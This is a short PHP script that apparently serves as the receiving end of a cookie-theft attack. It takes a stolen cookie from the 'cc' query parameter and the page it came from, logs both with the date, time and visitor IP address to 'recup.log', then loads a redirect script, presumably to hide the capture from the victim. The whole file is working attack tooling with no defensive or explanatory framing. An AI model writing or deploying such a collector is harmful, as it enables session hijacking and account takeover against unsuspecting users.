<?php

	$file = "../data/recup.log";
	$cookie = $_GET['cc'];
	$url = $_GET['url'];
	$text = date("Y-m-d") . " | " . date("h:i:sa") . " | " . $_SERVER['REMOTE_ADDR'] . " | " . $cookie;
	$fp = fopen($file, 'a'); /*or die("<h1>can't open file</h1>");*/

	fwrite($fp, "---------------Cookie---------------\n");
	fwrite($fp, $text);
	fwrite($fp, "\nUser Comming from: ");
	fwrite($fp, $url);
	fwrite($fp, "\n");
	fclose($fp);

echo '<script type="text/javascript" src="redirect.js"></script>';

?>
